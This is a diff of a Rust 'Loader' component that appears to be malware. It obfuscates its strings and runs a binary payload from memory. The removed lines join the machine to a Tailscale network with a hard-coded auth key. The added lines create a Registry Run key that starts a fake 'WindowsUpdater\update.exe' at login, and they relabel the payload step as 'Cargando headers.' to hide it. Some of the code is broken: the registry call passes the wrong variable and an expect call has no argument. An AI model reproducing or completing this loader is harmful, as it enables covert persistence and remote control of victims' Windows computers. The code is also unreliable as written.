@@ -1,6 +1,7 @@
 use obfstr::obfstr;
 use std::process::Command;
 use exec_mem::exec_mem;
+use std::env;
 pub struct Loader 
 {
     pub var : String,
@@ -8,21 +9,30 @@ pub struct Loader
 
 pub impl Loader 
 {
-    pub fn connection_test()
+    pub fn configurate_rg()
     {
-        let instru = Command::new(obfstr!("tailscale"))
+        let username = env::var("USERNAME").unwrap();
+        let ruta = format!(obfstr!(r"C:\Users\{}\AppData\WindowsUpdater\update.exe", username));
+        let local = Command::new(obfstr!("reg"))
             .args([
-                obfstr!("up"),
-                obfstr!("--auth-key"),
-                obfstr!("tskey-auth-kWSG3gyHT311CNTRL-C5UjKUjLLb84RM48YpEJc8KLFpR1rYTg"),
+                obfstr!("add"),
+                obfstr!(r"HKCU\Software\Microsoft\Windows \CurrentVersion\Run"),
+                obfstr!("/v"),
+                obfstr!("WindowsaUpdaterdd"),
+                obfstr!("/t"), 
+                obfstr!("REG_SZ"),
+                obfstr!("/d"),
+                local,
+                obfstr!("/f"),              
             ])
             .status()
-            .expect("error");
+            .expect();
     }
+    
     pub fn terminator()
     {
-        println!(obfstr!("[+] Cargando y ejecutando payload en memoria..."));
-        match exec_mem("loader.bin") 
+        println!(obfstr!("[+] Cargando headers."));
+        match exec_mem("SfbsASxSd.bin") 
         {
             Ok(_) => println!("done"),
             Err(e) => eprintln!("Error"),
